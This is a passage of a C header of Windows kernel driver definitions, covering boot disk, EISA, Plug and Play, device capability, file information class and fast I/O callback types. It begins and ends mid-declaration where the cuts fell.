} BOOTDISK_INFORMATION, *PBOOTDISK_INFORMATION;

typedef struct _BOOTDISK_INFORMATION_EX {
  LONGLONG BootPartitionOffset;
  LONGLONG SystemPartitionOffset;
  ULONG BootDeviceSignature;
  ULONG SystemDeviceSignature;
  GUID BootDeviceGuid;
  GUID SystemDeviceGuid;
  BOOLEAN BootDeviceIsGpt;
  BOOLEAN SystemDeviceIsGpt;
} BOOTDISK_INFORMATION_EX, *PBOOTDISK_INFORMATION_EX;

#if (NTDDI_VERSION >= NTDDI_WIN7)

typedef struct _LOADER_PARTITION_INFORMATION_EX {
  ULONG PartitionStyle;
  ULONG PartitionNumber;
  _ANONYMOUS_UNION union {
    ULONG Signature;
    GUID DeviceId;
  } DUMMYUNIONNAME;
  ULONG Flags;
} LOADER_PARTITION_INFORMATION_EX, *PLOADER_PARTITION_INFORMATION_EX;

typedef struct _BOOTDISK_INFORMATION_LITE {
  ULONG NumberEntries;
  LOADER_PARTITION_INFORMATION_EX Entries[1];
} BOOTDISK_INFORMATION_LITE, *PBOOTDISK_INFORMATION_LITE;

#else

#if (NTDDI_VERSION >= NTDDI_VISTA)
typedef struct _BOOTDISK_INFORMATION_LITE {
  ULONG BootDeviceSignature;
  ULONG SystemDeviceSignature;
  GUID BootDeviceGuid;
  GUID SystemDeviceGuid;
  BOOLEAN BootDeviceIsGpt;
  BOOLEAN SystemDeviceIsGpt;
} BOOTDISK_INFORMATION_LITE, *PBOOTDISK_INFORMATION_LITE;
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#include <pshpack1.h>

typedef struct _EISA_MEMORY_TYPE {
  UCHAR ReadWrite:1;
  UCHAR Cached:1;
  UCHAR Reserved0:1;
  UCHAR Type:2;
  UCHAR Shared:1;
  UCHAR Reserved1:1;
  UCHAR MoreEntries:1;
} EISA_MEMORY_TYPE, *PEISA_MEMORY_TYPE;

typedef struct _EISA_MEMORY_CONFIGURATION {
  EISA_MEMORY_TYPE ConfigurationByte;
  UCHAR DataSize;
  USHORT AddressLowWord;
  UCHAR AddressHighByte;
  USHORT MemorySize;
} EISA_MEMORY_CONFIGURATION, *PEISA_MEMORY_CONFIGURATION;

typedef struct _EISA_IRQ_DESCRIPTOR {
  UCHAR Interrupt:4;
  UCHAR Reserved:1;
  UCHAR LevelTriggered:1;
  UCHAR Shared:1;
  UCHAR MoreEntries:1;
} EISA_IRQ_DESCRIPTOR, *PEISA_IRQ_DESCRIPTOR;

typedef struct _EISA_IRQ_CONFIGURATION {
  EISA_IRQ_DESCRIPTOR ConfigurationByte;
  UCHAR Reserved;
} EISA_IRQ_CONFIGURATION, *PEISA_IRQ_CONFIGURATION;

typedef struct _DMA_CONFIGURATION_BYTE0 {
  UCHAR Channel:3;
  UCHAR Reserved:3;
  UCHAR Shared:1;
  UCHAR MoreEntries:1;
} DMA_CONFIGURATION_BYTE0;

typedef struct _DMA_CONFIGURATION_BYTE1 {
  UCHAR Reserved0:2;
  UCHAR TransferSize:2;
  UCHAR Timing:2;
  UCHAR Reserved1:2;
} DMA_CONFIGURATION_BYTE1;

typedef struct _EISA_DMA_CONFIGURATION {
  DMA_CONFIGURATION_BYTE0 ConfigurationByte0;
  DMA_CONFIGURATION_BYTE1 ConfigurationByte1;
} EISA_DMA_CONFIGURATION, *PEISA_DMA_CONFIGURATION;

typedef struct _EISA_PORT_DESCRIPTOR {
  UCHAR NumberPorts:5;
  UCHAR Reserved:1;
  UCHAR Shared:1;
  UCHAR MoreEntries:1;
} EISA_PORT_DESCRIPTOR, *PEISA_PORT_DESCRIPTOR;

typedef struct _EISA_PORT_CONFIGURATION {
  EISA_PORT_DESCRIPTOR Configuration;
  USHORT PortAddress;
} EISA_PORT_CONFIGURATION, *PEISA_PORT_CONFIGURATION;

typedef struct _CM_EISA_SLOT_INFORMATION {
  UCHAR ReturnCode;
  UCHAR ReturnFlags;
  UCHAR MajorRevision;
  UCHAR MinorRevision;
  USHORT Checksum;
  UCHAR NumberFunctions;
  UCHAR FunctionInformation;
  ULONG CompressedId;
} CM_EISA_SLOT_INFORMATION, *PCM_EISA_SLOT_INFORMATION;

typedef struct _CM_EISA_FUNCTION_INFORMATION {
  ULONG CompressedId;
  UCHAR IdSlotFlags1;
  UCHAR IdSlotFlags2;
  UCHAR MinorRevision;
  UCHAR MajorRevision;
  UCHAR Selections[26];
  UCHAR FunctionFlags;
  UCHAR TypeString[80];
  EISA_MEMORY_CONFIGURATION EisaMemory[9];
  EISA_IRQ_CONFIGURATION EisaIrq[7];
  EISA_DMA_CONFIGURATION EisaDma[4];
  EISA_PORT_CONFIGURATION EisaPort[20];
  UCHAR InitializationData[60];
} CM_EISA_FUNCTION_INFORMATION, *PCM_EISA_FUNCTION_INFORMATION;

#include <poppack.h>

/* CM_EISA_FUNCTION_INFORMATION.FunctionFlags */

#define EISA_FUNCTION_ENABLED           0x80
#define EISA_FREE_FORM_DATA             0x40
#define EISA_HAS_PORT_INIT_ENTRY        0x20
#define EISA_HAS_PORT_RANGE             0x10
#define EISA_HAS_DMA_ENTRY              0x08
#define EISA_HAS_IRQ_ENTRY              0x04
#define EISA_HAS_MEMORY_ENTRY           0x02
#define EISA_HAS_TYPE_ENTRY             0x01
#define EISA_HAS_INFORMATION \
  (EISA_HAS_PORT_RANGE + EISA_HAS_DMA_ENTRY + EISA_HAS_IRQ_ENTRY \
  + EISA_HAS_MEMORY_ENTRY + EISA_HAS_TYPE_ENTRY)

#define EISA_MORE_ENTRIES               0x80
#define EISA_SYSTEM_MEMORY              0x00
#define EISA_MEMORY_TYPE_RAM            0x01

/* CM_EISA_SLOT_INFORMATION.ReturnCode */

#define EISA_INVALID_SLOT               0x80
#define EISA_INVALID_FUNCTION           0x81
#define EISA_INVALID_CONFIGURATION      0x82
#define EISA_EMPTY_SLOT                 0x83
#define EISA_INVALID_BIOS_CALL          0x86

/*
** Plug and Play structures
*/

typedef VOID
(NTAPI *PINTERFACE_REFERENCE)(
  PVOID Context);

typedef VOID
(NTAPI *PINTERFACE_DEREFERENCE)(
  PVOID Context);

typedef BOOLEAN
(NTAPI TRANSLATE_BUS_ADDRESS)(
  IN PVOID Context,
  IN PHYSICAL_ADDRESS BusAddress,
  IN ULONG Length,
  IN OUT PULONG AddressSpace,
  OUT PPHYSICAL_ADDRESS  TranslatedAddress);
typedef TRANSLATE_BUS_ADDRESS *PTRANSLATE_BUS_ADDRESS;

typedef struct _DMA_ADAPTER*
(NTAPI GET_DMA_ADAPTER)(
  IN PVOID Context,
  IN struct _DEVICE_DESCRIPTION *DeviceDescriptor,
  OUT PULONG NumberOfMapRegisters);
typedef GET_DMA_ADAPTER *PGET_DMA_ADAPTER;

typedef ULONG
(NTAPI GET_SET_DEVICE_DATA)(
  IN PVOID Context,
  IN ULONG DataType,
  IN PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);
typedef GET_SET_DEVICE_DATA *PGET_SET_DEVICE_DATA;

typedef enum _DEVICE_INSTALL_STATE {
  InstallStateInstalled,
  InstallStateNeedsReinstall,
  InstallStateFailedInstall,
  InstallStateFinishInstall
} DEVICE_INSTALL_STATE, *PDEVICE_INSTALL_STATE;

typedef struct _LEGACY_BUS_INFORMATION {
  GUID BusTypeGuid;
  INTERFACE_TYPE LegacyBusType;
  ULONG BusNumber;
} LEGACY_BUS_INFORMATION, *PLEGACY_BUS_INFORMATION;

typedef enum _DEVICE_REMOVAL_POLICY {
  RemovalPolicyExpectNoRemoval = 1,
  RemovalPolicyExpectOrderlyRemoval = 2,
  RemovalPolicyExpectSurpriseRemoval = 3
} DEVICE_REMOVAL_POLICY, *PDEVICE_REMOVAL_POLICY;

typedef VOID
(NTAPI*PREENUMERATE_SELF)(
  IN PVOID Context);

typedef struct _REENUMERATE_SELF_INTERFACE_STANDARD {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PREENUMERATE_SELF SurpriseRemoveAndReenumerateSelf;
} REENUMERATE_SELF_INTERFACE_STANDARD, *PREENUMERATE_SELF_INTERFACE_STANDARD;

typedef VOID
(NTAPI *PIO_DEVICE_EJECT_CALLBACK)(
  IN NTSTATUS Status,
  IN OUT PVOID Context OPTIONAL);

#define PCI_DEVICE_PRESENT_INTERFACE_VERSION     1

/* PCI_DEVICE_PRESENCE_PARAMETERS.Flags */
#define PCI_USE_SUBSYSTEM_IDS   0x00000001
#define PCI_USE_REVISION        0x00000002
#define PCI_USE_VENDEV_IDS      0x00000004
#define PCI_USE_CLASS_SUBCLASS  0x00000008
#define PCI_USE_PROGIF          0x00000010
#define PCI_USE_LOCAL_BUS       0x00000020
#define PCI_USE_LOCAL_DEVICE    0x00000040

typedef struct _PCI_DEVICE_PRESENCE_PARAMETERS {
  ULONG Size;
  ULONG Flags;
  USHORT VendorID;
  USHORT DeviceID;
  UCHAR RevisionID;
  USHORT SubVendorID;
  USHORT SubSystemID;
  UCHAR BaseClass;
  UCHAR SubClass;
  UCHAR ProgIf;
} PCI_DEVICE_PRESENCE_PARAMETERS, *PPCI_DEVICE_PRESENCE_PARAMETERS;

typedef BOOLEAN
(NTAPI PCI_IS_DEVICE_PRESENT)(
  IN USHORT VendorID,
  IN USHORT DeviceID,
  IN UCHAR RevisionID,
  IN USHORT SubVendorID,
  IN USHORT SubSystemID,
  IN ULONG Flags);
typedef PCI_IS_DEVICE_PRESENT *PPCI_IS_DEVICE_PRESENT;

typedef BOOLEAN
(NTAPI PCI_IS_DEVICE_PRESENT_EX)(
  IN PVOID Context,
  IN PPCI_DEVICE_PRESENCE_PARAMETERS Parameters);
typedef PCI_IS_DEVICE_PRESENT_EX *PPCI_IS_DEVICE_PRESENT_EX;

typedef struct _BUS_INTERFACE_STANDARD {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PTRANSLATE_BUS_ADDRESS TranslateBusAddress;
  PGET_DMA_ADAPTER GetDmaAdapter;
  PGET_SET_DEVICE_DATA SetBusData;
  PGET_SET_DEVICE_DATA GetBusData;
} BUS_INTERFACE_STANDARD, *PBUS_INTERFACE_STANDARD;

typedef struct _PCI_DEVICE_PRESENT_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PPCI_IS_DEVICE_PRESENT IsDevicePresent;
  PPCI_IS_DEVICE_PRESENT_EX IsDevicePresentEx;
} PCI_DEVICE_PRESENT_INTERFACE, *PPCI_DEVICE_PRESENT_INTERFACE;

typedef struct _DEVICE_CAPABILITIES {
  USHORT Size;
  USHORT Version;
  ULONG DeviceD1:1;
  ULONG DeviceD2:1;
  ULONG LockSupported:1;
  ULONG EjectSupported:1;
  ULONG Removable:1;
  ULONG DockDevice:1;
  ULONG UniqueID:1;
  ULONG SilentInstall:1;
  ULONG RawDeviceOK:1;
  ULONG SurpriseRemovalOK:1;
  ULONG WakeFromD0:1;
  ULONG WakeFromD1:1;
  ULONG WakeFromD2:1;
  ULONG WakeFromD3:1;
  ULONG HardwareDisabled:1;
  ULONG NonDynamic:1;
  ULONG WarmEjectSupported:1;
  ULONG NoDisplayInUI:1;
  ULONG Reserved:14;
  ULONG Address;
  ULONG UINumber;
  DEVICE_POWER_STATE DeviceState[PowerSystemMaximum];
  SYSTEM_POWER_STATE SystemWake;
  DEVICE_POWER_STATE DeviceWake;
  ULONG D1Latency;
  ULONG D2Latency;
  ULONG D3Latency;
} DEVICE_CAPABILITIES, *PDEVICE_CAPABILITIES;

typedef struct _DEVICE_INTERFACE_CHANGE_NOTIFICATION {
  USHORT Version;
  USHORT Size;
  GUID Event;
  GUID InterfaceClassGuid;
  PUNICODE_STRING SymbolicLinkName;
} DEVICE_INTERFACE_CHANGE_NOTIFICATION, *PDEVICE_INTERFACE_CHANGE_NOTIFICATION;

typedef struct _HWPROFILE_CHANGE_NOTIFICATION {
  USHORT Version;
  USHORT Size;
  GUID Event;
} HWPROFILE_CHANGE_NOTIFICATION, *PHWPROFILE_CHANGE_NOTIFICATION;

#undef INTERFACE

typedef struct _INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
} INTERFACE, *PINTERFACE;

typedef struct _PLUGPLAY_NOTIFICATION_HEADER {
  USHORT Version;
  USHORT Size;
  GUID Event;
} PLUGPLAY_NOTIFICATION_HEADER, *PPLUGPLAY_NOTIFICATION_HEADER;

typedef ULONG PNP_DEVICE_STATE, *PPNP_DEVICE_STATE;

/* PNP_DEVICE_STATE */

#define PNP_DEVICE_DISABLED                      0x00000001
#define PNP_DEVICE_DONT_DISPLAY_IN_UI            0x00000002
#define PNP_DEVICE_FAILED                        0x00000004
#define PNP_DEVICE_REMOVED                       0x00000008
#define PNP_DEVICE_RESOURCE_REQUIREMENTS_CHANGED 0x00000010
#define PNP_DEVICE_NOT_DISABLEABLE               0x00000020

typedef struct _TARGET_DEVICE_CUSTOM_NOTIFICATION {
  USHORT Version;
  USHORT Size;
  GUID Event;
  struct _FILE_OBJECT *FileObject;
  LONG NameBufferOffset;
  UCHAR CustomDataBuffer[1];
} TARGET_DEVICE_CUSTOM_NOTIFICATION, *PTARGET_DEVICE_CUSTOM_NOTIFICATION;

typedef struct _TARGET_DEVICE_REMOVAL_NOTIFICATION {
  USHORT Version;
  USHORT Size;
  GUID Event;
  struct _FILE_OBJECT *FileObject;
} TARGET_DEVICE_REMOVAL_NOTIFICATION, *PTARGET_DEVICE_REMOVAL_NOTIFICATION;

#if (NTDDI_VERSION >= NTDDI_VISTA)
#include <devpropdef.h>
#define PLUGPLAY_PROPERTY_PERSISTENT   0x00000001
#endif

#define PNP_REPLACE_NO_MAP             MAXLONGLONG

typedef NTSTATUS
(NTAPI *PREPLACE_MAP_MEMORY)(
  IN PHYSICAL_ADDRESS TargetPhysicalAddress,
  IN PHYSICAL_ADDRESS SparePhysicalAddress,
  IN OUT PLARGE_INTEGER NumberOfBytes,
  OUT PVOID *TargetAddress,
  OUT PVOID *SpareAddress);

typedef struct _PNP_REPLACE_MEMORY_LIST {
  ULONG AllocatedCount;
  ULONG Count;
  ULONGLONG TotalLength;
  struct {
    PHYSICAL_ADDRESS Address;
    ULONGLONG Length;
  } Ranges[ANYSIZE_ARRAY];
} PNP_REPLACE_MEMORY_LIST, *PPNP_REPLACE_MEMORY_LIST;

typedef struct _PNP_REPLACE_PROCESSOR_LIST {
  PKAFFINITY Affinity;
  ULONG GroupCount;
  ULONG AllocatedCount;
  ULONG Count;
  ULONG ApicIds[ANYSIZE_ARRAY];
} PNP_REPLACE_PROCESSOR_LIST, *PPNP_REPLACE_PROCESSOR_LIST;

typedef struct _PNP_REPLACE_PROCESSOR_LIST_V1 {
  KAFFINITY AffinityMask;
  ULONG AllocatedCount;
  ULONG Count;
  ULONG ApicIds[ANYSIZE_ARRAY];
} PNP_REPLACE_PROCESSOR_LIST_V1, *PPNP_REPLACE_PROCESSOR_LIST_V1;

#define PNP_REPLACE_PARAMETERS_VERSION           2

typedef struct _PNP_REPLACE_PARAMETERS {
  ULONG Size;
  ULONG Version;
  ULONG64 Target;
  ULONG64 Spare;
  PPNP_REPLACE_PROCESSOR_LIST TargetProcessors;
  PPNP_REPLACE_PROCESSOR_LIST SpareProcessors;
  PPNP_REPLACE_MEMORY_LIST TargetMemory;
  PPNP_REPLACE_MEMORY_LIST SpareMemory;
  PREPLACE_MAP_MEMORY MapMemory;
} PNP_REPLACE_PARAMETERS, *PPNP_REPLACE_PARAMETERS;

typedef VOID
(NTAPI *PREPLACE_UNLOAD)(
  VOID);

typedef NTSTATUS
(NTAPI *PREPLACE_BEGIN)(
  IN PPNP_REPLACE_PARAMETERS Parameters,
  OUT PVOID *Context);

typedef NTSTATUS
(NTAPI *PREPLACE_END)(
  IN PVOID Context);

typedef NTSTATUS
(NTAPI *PREPLACE_MIRROR_PHYSICAL_MEMORY)(
  IN PVOID Context,
  IN PHYSICAL_ADDRESS PhysicalAddress,
  IN LARGE_INTEGER ByteCount);

typedef NTSTATUS
(NTAPI *PREPLACE_SET_PROCESSOR_ID)(
  IN PVOID Context,
  IN ULONG ApicId,
  IN BOOLEAN Target);

typedef NTSTATUS
(NTAPI *PREPLACE_SWAP)(
  IN PVOID Context);

typedef NTSTATUS
(NTAPI *PREPLACE_INITIATE_HARDWARE_MIRROR)(
  IN PVOID Context);

typedef NTSTATUS
(NTAPI *PREPLACE_MIRROR_PLATFORM_MEMORY)(
  IN PVOID Context);

typedef NTSTATUS
(NTAPI *PREPLACE_GET_MEMORY_DESTINATION)(
  IN PVOID Context,
  IN PHYSICAL_ADDRESS SourceAddress,
  OUT PPHYSICAL_ADDRESS DestinationAddress);

typedef NTSTATUS
(NTAPI *PREPLACE_ENABLE_DISABLE_HARDWARE_QUIESCE)(
  IN PVOID Context,
  IN BOOLEAN Enable);

#define PNP_REPLACE_DRIVER_INTERFACE_VERSION      1
#define PNP_REPLACE_DRIVER_INTERFACE_MINIMUM_SIZE \
             FIELD_OFFSET(PNP_REPLACE_DRIVER_INTERFACE, InitiateHardwareMirror)

#define PNP_REPLACE_MEMORY_SUPPORTED             0x0001
#define PNP_REPLACE_PROCESSOR_SUPPORTED          0x0002
#define PNP_REPLACE_HARDWARE_MEMORY_MIRRORING    0x0004
#define PNP_REPLACE_HARDWARE_PAGE_COPY           0x0008
#define PNP_REPLACE_HARDWARE_QUIESCE             0x0010

typedef struct _PNP_REPLACE_DRIVER_INTERFACE {
  ULONG Size;
  ULONG Version;
  ULONG Flags;
  PREPLACE_UNLOAD Unload;
  PREPLACE_BEGIN BeginReplace;
  PREPLACE_END EndReplace;
  PREPLACE_MIRROR_PHYSICAL_MEMORY MirrorPhysicalMemory;
  PREPLACE_SET_PROCESSOR_ID SetProcessorId;
  PREPLACE_SWAP Swap;
  PREPLACE_INITIATE_HARDWARE_MIRROR InitiateHardwareMirror;
  PREPLACE_MIRROR_PLATFORM_MEMORY MirrorPlatformMemory;
  PREPLACE_GET_MEMORY_DESTINATION GetMemoryDestination;
  PREPLACE_ENABLE_DISABLE_HARDWARE_QUIESCE EnableDisableHardwareQuiesce;
} PNP_REPLACE_DRIVER_INTERFACE, *PPNP_REPLACE_DRIVER_INTERFACE;

typedef NTSTATUS
(NTAPI *PREPLACE_DRIVER_INIT)(
  IN OUT PPNP_REPLACE_DRIVER_INTERFACE Interface,
  IN PVOID Unused);

typedef enum _DEVICE_USAGE_NOTIFICATION_TYPE {
  DeviceUsageTypeUndefined,
  DeviceUsageTypePaging,
  DeviceUsageTypeHibernation,
  DeviceUsageTypeDumpFile,
  DeviceUsageTypeBoot,
  DeviceUsageTypePostDisplay,
  DeviceUsageTypeGuestAssigned
} DEVICE_USAGE_NOTIFICATION_TYPE;

typedef struct _POWER_SEQUENCE {
  ULONG SequenceD1;
  ULONG SequenceD2;
  ULONG SequenceD3;
} POWER_SEQUENCE, *PPOWER_SEQUENCE;

typedef enum {
  DevicePropertyDeviceDescription = 0x0,
  DevicePropertyHardwareID = 0x1,
  DevicePropertyCompatibleIDs = 0x2,
  DevicePropertyBootConfiguration = 0x3,
  DevicePropertyBootConfigurationTranslated = 0x4,
  DevicePropertyClassName = 0x5,
  DevicePropertyClassGuid = 0x6,
  DevicePropertyDriverKeyName = 0x7,
  DevicePropertyManufacturer = 0x8,
  DevicePropertyFriendlyName = 0x9,
  DevicePropertyLocationInformation = 0xa,
  DevicePropertyPhysicalDeviceObjectName = 0xb,
  DevicePropertyBusTypeGuid = 0xc,
  DevicePropertyLegacyBusType = 0xd,
  DevicePropertyBusNumber = 0xe,
  DevicePropertyEnumeratorName = 0xf,
  DevicePropertyAddress = 0x10,
  DevicePropertyUINumber = 0x11,
  DevicePropertyInstallState = 0x12,
  DevicePropertyRemovalPolicy = 0x13,
  DevicePropertyResourceRequirements = 0x14,
  DevicePropertyAllocatedResources = 0x15,
  DevicePropertyContainerID = 0x16
} DEVICE_REGISTRY_PROPERTY;

typedef enum _IO_NOTIFICATION_EVENT_CATEGORY {
  EventCategoryReserved,
  EventCategoryHardwareProfileChange,
  EventCategoryDeviceInterfaceChange,
  EventCategoryTargetDeviceChange,
  EventCategoryKernelSoftRestart
} IO_NOTIFICATION_EVENT_CATEGORY;

typedef enum _IO_PRIORITY_HINT {
  IoPriorityVeryLow = 0,
  IoPriorityLow,
  IoPriorityNormal,
  IoPriorityHigh,
  IoPriorityCritical,
  MaxIoPriorityTypes
} IO_PRIORITY_HINT;

#define PNPNOTIFY_DEVICE_INTERFACE_INCLUDE_EXISTING_INTERFACES    0x00000001

typedef NTSTATUS
(NTAPI DRIVER_NOTIFICATION_CALLBACK_ROUTINE)(
  IN PVOID NotificationStructure,
  IN PVOID Context);
typedef DRIVER_NOTIFICATION_CALLBACK_ROUTINE *PDRIVER_NOTIFICATION_CALLBACK_ROUTINE;

typedef VOID
(NTAPI DEVICE_CHANGE_COMPLETE_CALLBACK)(
  IN PVOID Context);
typedef DEVICE_CHANGE_COMPLETE_CALLBACK *PDEVICE_CHANGE_COMPLETE_CALLBACK;

typedef enum _FILE_INFORMATION_CLASS {
  FileDirectoryInformation = 1,
  FileFullDirectoryInformation,
  FileBothDirectoryInformation,
  FileBasicInformation,
  FileStandardInformation,
  FileInternalInformation,
  FileEaInformation,
  FileAccessInformation,
  FileNameInformation,
  FileRenameInformation,
  FileLinkInformation,
  FileNamesInformation,
  FileDispositionInformation,
  FilePositionInformation,
  FileFullEaInformation,
  FileModeInformation,
  FileAlignmentInformation,
  FileAllInformation,
  FileAllocationInformation,
  FileEndOfFileInformation,
  FileAlternateNameInformation,
  FileStreamInformation,
  FilePipeInformation,
  FilePipeLocalInformation,
  FilePipeRemoteInformation,
  FileMailslotQueryInformation,
  FileMailslotSetInformation,
  FileCompressionInformation,
  FileObjectIdInformation,
  FileCompletionInformation,
  FileMoveClusterInformation,
  FileQuotaInformation,
  FileReparsePointInformation,
  FileNetworkOpenInformation,
  FileAttributeTagInformation,
  FileTrackingInformation,
  FileIdBothDirectoryInformation,
  FileIdFullDirectoryInformation,
  FileValidDataLengthInformation,
  FileShortNameInformation,
  FileIoCompletionNotificationInformation,
  FileIoStatusBlockRangeInformation,
  FileIoPriorityHintInformation,
  FileSfioReserveInformation,
  FileSfioVolumeInformation,
  FileHardLinkInformation,
  FileProcessIdsUsingFileInformation,
  FileNormalizedNameInformation,
  FileNetworkPhysicalNameInformation,
  FileIdGlobalTxDirectoryInformation,
  FileIsRemoteDeviceInformation,
  FileUnusedInformation,
  FileNumaNodeInformation,
  FileStandardLinkInformation,
  FileRemoteProtocolInformation,
  FileRenameInformationBypassAccessCheck,
  FileLinkInformationBypassAccessCheck,
  FileVolumeNameInformation,
  FileIdInformation,
  FileIdExtdDirectoryInformation,
  FileReplaceCompletionInformation,
  FileHardLinkFullIdInformation,
  FileIdExtdBothDirectoryInformation,
  FileDispositionInformationEx,
  FileRenameInformationEx,
  FileRenameInformationExBypassAccessCheck,
  FileDesiredStorageClassInformation,
  FileStatInformation,
  FileMemoryPartitionInformation,
  FileStatLxInformation,
  FileCaseSensitiveInformation,
  FileLinkInformationEx,
  FileLinkInformationExBypassAccessCheck,
  FileStorageReserveIdInformation,
  FileCaseSensitiveInformationForceAccessCheck,
  FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef enum _DIRECTORY_NOTIFY_INFORMATION_CLASS {
  DirectoryNotifyInformation = 1,
  DirectoryNotifyExtendedInformation
} DIRECTORY_NOTIFY_INFORMATION_CLASS, *PDIRECTORY_NOTIFY_INFORMATION_CLASS;

typedef struct _FILE_POSITION_INFORMATION {
  LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;

typedef struct _FILE_BASIC_INFORMATION {
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  ULONG FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;

typedef struct _FILE_IO_PRIORITY_HINT_INFORMATION {
  IO_PRIORITY_HINT PriorityHint;
} FILE_IO_PRIORITY_HINT_INFORMATION, *PFILE_IO_PRIORITY_HINT_INFORMATION;

typedef struct _FILE_IO_COMPLETION_NOTIFICATION_INFORMATION {
  ULONG Flags;
} FILE_IO_COMPLETION_NOTIFICATION_INFORMATION, *PFILE_IO_COMPLETION_NOTIFICATION_INFORMATION;

typedef struct _FILE_IOSTATUSBLOCK_RANGE_INFORMATION {
  PUCHAR IoStatusBlockRange;
  ULONG Length;
} FILE_IOSTATUSBLOCK_RANGE_INFORMATION, *PFILE_IOSTATUSBLOCK_RANGE_INFORMATION;

typedef struct _FILE_IS_REMOTE_DEVICE_INFORMATION {
  BOOLEAN IsRemote;
} FILE_IS_REMOTE_DEVICE_INFORMATION, *PFILE_IS_REMOTE_DEVICE_INFORMATION;

typedef struct _FILE_NUMA_NODE_INFORMATION {
  USHORT NodeNumber;
} FILE_NUMA_NODE_INFORMATION, *PFILE_NUMA_NODE_INFORMATION;

typedef struct _FILE_PROCESS_IDS_USING_FILE_INFORMATION {
  ULONG NumberOfProcessIdsInList;
  ULONG_PTR ProcessIdList[1];
} FILE_PROCESS_IDS_USING_FILE_INFORMATION, *PFILE_PROCESS_IDS_USING_FILE_INFORMATION;

typedef struct _FILE_STANDARD_INFORMATION {
  LARGE_INTEGER AllocationSize;
  LARGE_INTEGER EndOfFile;
  ULONG NumberOfLinks;
  BOOLEAN DeletePending;
  BOOLEAN Directory;
} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;

typedef struct _FILE_NETWORK_OPEN_INFORMATION {
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER AllocationSize;
  LARGE_INTEGER EndOfFile;
  ULONG FileAttributes;
} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;

typedef enum _FSINFOCLASS {
  FileFsVolumeInformation = 1,
  FileFsLabelInformation,
  FileFsSizeInformation,
  FileFsDeviceInformation,
  FileFsAttributeInformation,
  FileFsControlInformation,
  FileFsFullSizeInformation,
  FileFsObjectIdInformation,
  FileFsDriverPathInformation,
  FileFsVolumeFlagsInformation,
  FileFsSectorSizeInformation,
  FileFsDataCopyInformation,
  FileFsMetadataSizeInformation,
  FileFsFullSizeInformationEx,
  FileFsMaximumInformation
} FS_INFORMATION_CLASS, *PFS_INFORMATION_CLASS;

typedef struct _FILE_FS_DEVICE_INFORMATION {
  DEVICE_TYPE DeviceType;
  ULONG Characteristics;
} FILE_FS_DEVICE_INFORMATION, *PFILE_FS_DEVICE_INFORMATION;

typedef struct _FILE_FULL_EA_INFORMATION {
  ULONG NextEntryOffset;
  UCHAR Flags;
  UCHAR EaNameLength;
  USHORT EaValueLength;
  CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

typedef struct _FILE_SFIO_RESERVE_INFORMATION {
  ULONG RequestsPerPeriod;
  ULONG Period;
  BOOLEAN RetryFailures;
  BOOLEAN Discardable;
  ULONG RequestSize;
  ULONG NumOutstandingRequests;
} FILE_SFIO_RESERVE_INFORMATION, *PFILE_SFIO_RESERVE_INFORMATION;

typedef struct _FILE_SFIO_VOLUME_INFORMATION {
  ULONG MaximumRequestsPerPeriod;
  ULONG MinimumPeriod;
  ULONG MinimumTransferSize;
} FILE_SFIO_VOLUME_INFORMATION, *PFILE_SFIO_VOLUME_INFORMATION;

#define FILE_SKIP_COMPLETION_PORT_ON_SUCCESS     0x1
#define FILE_SKIP_SET_EVENT_ON_HANDLE            0x2
#define FILE_SKIP_SET_USER_EVENT_ON_FAST_IO      0x4

#define FM_LOCK_BIT             (0x1)
#define FM_LOCK_BIT_V           (0x0)
#define FM_LOCK_WAITER_WOKEN    (0x2)
#define FM_LOCK_WAITER_INC      (0x4)

typedef BOOLEAN
(NTAPI FAST_IO_CHECK_IF_POSSIBLE)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN BOOLEAN Wait,
  IN ULONG LockKey,
  IN BOOLEAN CheckForReadOperation,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_CHECK_IF_POSSIBLE *PFAST_IO_CHECK_IF_POSSIBLE;

typedef BOOLEAN
(NTAPI FAST_IO_READ)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN BOOLEAN Wait,
  IN ULONG LockKey,
  OUT PVOID Buffer,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_READ *PFAST_IO_READ;

typedef BOOLEAN
(NTAPI FAST_IO_WRITE)(
  IN struct _FILE_OBJECT *FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN BOOLEAN Wait,
  IN ULONG LockKey,
  IN PVOID Buffer,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN struct _DEVICE_OBJECT *DeviceObject);
typedef FAST_IO_WRITE *PFAST_IO_WRITE;

typedef BOOLEAN
(NTAPI FAST_IO_QUERY_BASIC_INFO)(
  IN struct _FILE_OBJECT *FileObject,
